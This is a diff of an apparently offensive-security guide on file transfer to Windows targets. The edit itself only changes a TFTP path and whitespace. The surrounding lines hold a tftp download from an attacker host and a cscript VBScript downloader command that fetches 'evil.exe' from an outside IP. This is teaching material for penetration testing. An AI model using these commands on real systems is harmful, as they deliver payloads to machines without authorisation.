@@ -55,7 +55,7 @@ So now you can upload and download whatever from the windows-machine like this
 tftp -i 192.160.1.101 GET wget.exe
 ```
 
-I usually put all files I want to make available in **/usr/tftp**
+I usually put all files I want to make available in **/srv/tftp**
 
 ## VBScript
 
@@ -91,7 +91,7 @@ echo Next >> wget.vbs
 echo ts.Close >> wget.vbs
 ```
 
-You then execute the script like this:   
+You then execute the script like this:  
 **cscript wget.vbs **[http://192.168.10.5/evil.exe](http://192.168.10.5/evil.exe)** evil.exe**
 
 The script works great and I found it at the this guys gist: [https://gist.github.com/sckalath/ec7af6a1786e3de6c309](https://gist.github.com/sckalath/ec7af6a1786e3de6c309)
